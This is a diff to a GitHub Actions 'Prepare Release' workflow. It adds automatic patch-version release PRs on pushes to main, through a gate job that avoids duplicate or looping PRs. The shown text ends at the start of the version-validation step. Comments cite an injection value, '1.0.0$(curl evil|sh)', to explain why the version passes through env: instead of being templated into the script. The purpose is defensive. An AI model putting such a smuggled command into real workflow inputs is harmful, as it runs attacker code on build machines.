@@ -1,49 +1,121 @@
 name: Prepare Release
 
-# Manually triggered ("gh workflow run prepare-release.yml -f version=X.Y.Z",
-# or the Actions tab's "Run workflow" button): opens a "Release vX.Y.Z" PR
-# into main with a generated changelog, rather than tagging directly. main's
-# branch ruleset requires a PR with an approving review before anything
-# lands there, including this -- see CLAUDE.md's "Branch, PR & release
-# workflow" section for the full flow. tag-release.yml is this workflow's
-# other half: once a reviewer approves and merges the PR this opens, that
-# tags the merge commit and triggers release.yml.
+# Two triggers:
+#   1. workflow_dispatch (Actions tab, or "gh workflow run prepare-release.yml
+#      -f version=X.Y.Z") -- an explicit version, chosen by whoever runs it.
+#   2. push to main -- every ordinary merge auto-opens a "Release vX.Y.Z" PR
+#      with the next patch version bumped automatically, so cutting a
+#      release no longer needs a person to remember to run this. The gate
+#      job below skips two cases so this can't loop or duplicate itself:
+#      a push that IS itself a release/vX.Y.Z branch merging in (that merge
+#      is what tag-release.yml reacts to -- auto-opening another release PR
+#      immediately after would just propose re-releasing nothing new), and
+#      a push landing while a "Release vX.Y.Z" PR is already open (wait for
+#      that one to merge or close first rather than stacking a second).
+#
+# Either way this only OPENS a PR into main -- main's branch ruleset still
+# requires a PR with a green "Build, vet & test" check before anything
+# lands there, including this, and the release PR's own bot-authored HEAD
+# commit still gets held at `action_required` for a person to approve (see
+# CLAUDE.md's "Branch, PR & release workflow"). Automating this step does
+# not remove either safety gate -- it only automates picking a version
+# number and opening the PR, the same two things a person otherwise has to
+# remember to do after every merge.
 
 on:
   workflow_dispatch:
     inputs:
       version:
-        description: "Version to release, without the leading v (e.g. 4.0.26)"
-        required: true
+        description: "Version to release, without the leading v (e.g. 4.0.26). Leave blank to auto-bump the patch version."
+        required: false
+  push:
+    branches: [main]
+
+concurrency:
+  group: prepare-release
+  cancel-in-progress: false
 
 permissions:
   contents: write
   pull-requests: write
 
 jobs:
+  gate:
+    runs-on: ubuntu-latest
+    outputs:
+      should_run: ${{ steps.decide.outputs.should_run }}
+      version: ${{ steps.decide.outputs.version }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+
+      - name: Decide whether to open a release PR, and with which version
+        id: decide
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_VERSION: ${{ inputs.version }}
+        run: |
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            if [ -n "$INPUT_VERSION" ]; then
+              echo "should_run=true" >> "$GITHUB_OUTPUT"
+              echo "version=$INPUT_VERSION" >> "$GITHUB_OUTPUT"
+              exit 0
+            fi
+            # workflow_dispatch with no version given: fall through to the
+            # same auto-bump logic a push uses.
+          fi
+
+          last_subject="$(git log -1 --format=%s)"
+          if [[ "$last_subject" =~ ^Merge\ pull\ request\ \#[0-9]+\ from\ .+/release/v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "last commit is a release-branch merge ($last_subject) -- tag-release.yml handles this, not opening another release PR" >&2
+            echo "should_run=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          open_release_prs="$(gh pr list --repo "${{ github.repository }}" --base main --label release --state open --json number --jq 'length')"
+          if [ "$open_release_prs" -gt 0 ]; then
+            echo "a release PR is already open -- waiting for it before opening another" >&2
+            echo "should_run=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          latest_tag="$(git tag --list 'v*.*.*' --sort=-v:refname | head -1)"
+          if [ -z "$latest_tag" ]; then
+            echo "no existing vX.Y.Z tag found to bump from" >&2
+            exit 1
+          fi
+          version="${latest_tag#v}"
+          major="${version%%.*}"
+          rest="${version#*.}"
+          minor="${rest%%.*}"
+          patch="${rest#*.}"
+          next_version="$major.$minor.$((patch + 1))"
+          echo "should_run=true" >> "$GITHUB_OUTPUT"
+          echo "version=$next_version" >> "$GITHUB_OUTPUT"
+
   prepare:
+    needs: gate
+    if: needs.gate.outputs.should_run == 'true'
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           fetch-depth: 0
 
-      # inputs.version is a free-text workflow_dispatch input -- anyone who
-      # can trigger this workflow controls it, and it may contain shell
-      # metacharacters. It's passed via env: rather than spliced into the
-      # script text with ${{ }}: that splicing happens at YAML-templating
-      # time, before bash ever parses the line, so the regex check further
-      # down would run too late to matter against a value like
-      # "1.0.0$(curl evil|sh)" if it were interpolated directly -- the
-      # injected command would already have executed as part of building
-      # the "version=..." assignment itself. Routed through env: and
-      # referenced as "$version", it's just a string value to bash no
-      # matter what it contains, and the regex check is then a real,
-      # effective gate on top of that.
+      # needs.gate.outputs.version is either a free-text workflow_dispatch
+      # input or this job's own computed "$major.$minor.$patch" string --
+      # either way it may not be attacker-free-text-safe by construction,
+      # so it's still routed through env: rather than spliced into the
+      # script text with ${{ }} (which would splice at YAML-templating
+      # time, before bash ever parses the line -- see the regex check
+      # immediately below, which would run too late against a value like
+      # "1.0.0$(curl evil|sh)" if it were interpolated directly instead).
       - name: Validate version, compute tag/branch names
         id: meta
         env:
-          VERSION_INPUT: ${{ inputs.version }}
+          VERSION_INPUT: ${{ needs.gate.outputs.version }}
         run: |
           version="$VERSION_INPUT"
           if ! [[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
